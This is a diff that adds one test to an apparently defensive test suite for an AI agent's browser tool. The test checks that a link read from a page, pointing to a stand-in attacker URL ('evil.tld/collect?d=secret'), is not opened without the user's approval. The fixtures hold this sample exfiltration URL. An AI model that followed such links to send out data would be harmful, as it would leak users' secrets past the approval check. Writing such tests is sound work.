@@ -2463,6 +2463,19 @@ test("open_tab during a search asks the card for an address not read (with its r
   }, { address: true });
 });
 
+test("a link list read on a local page stays the agent's writing after the tab goes back to a site: navigate by number asks the card", async () => {
+  await withSearch(async ({ call, fake }) => {
+    expect((await call("navigate", { id: "github", url: "http://localhost:3002/" })).isError).toBe(false);
+    fake.linkSequence = [[{ text: "Suite", url: "https://evil.tld/collect?d=secret" }]];
+    expect((await call("read_tab", { id: "github", links: true })).text).toContain("0. Suite — https://evil.tld/collect?d=secret");
+    // The user takes the tab back to the site and speaks from it.
+    await fake.navigate("github", github.url);
+    expect((await call("navigate", { id: "github", link: 0 })).text).toBe(DENIAL_TEXT);
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(1);
+    expect(fake.calls.some((x) => x.method === "navigate" && x.args[1] === "https://evil.tld/collect?d=secret")).toBe(false);
+  }, { address: false, allow: true });
+});
+
 test("outside a search, a composed address asks its card once per conversation; refused, nothing opens; read, local or a readable tab's address is free", async () => {
   await withSearch(async ({ call, fake }) => {
     expect((await call("open_tab", { url: "https://evil.tld/?d=secret", reason: "voir" })).text).toBe(DENIAL_TEXT);
